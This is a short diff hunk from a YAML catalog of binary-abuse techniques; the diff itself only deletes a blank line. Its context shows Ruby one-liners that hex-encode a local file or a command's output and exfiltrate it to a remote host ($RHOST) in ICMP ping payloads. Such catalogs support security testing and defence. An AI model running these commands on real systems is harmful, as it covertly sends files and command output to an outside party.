@@ -19,7 +19,6 @@ functions:
       code: |
         ruby -e 'data=File.read("$LFILE").unpack("H*")[0];
         0.step(data.size-1,16){|i| system("ping -c1 -p #{data[i,16]} $RHOST") }'
-
     - description: Send command output over ICMP using hex-encoded payloads.
       code: |
         ruby -e 'data=%x{$CMD}.unpack("H*")[0];
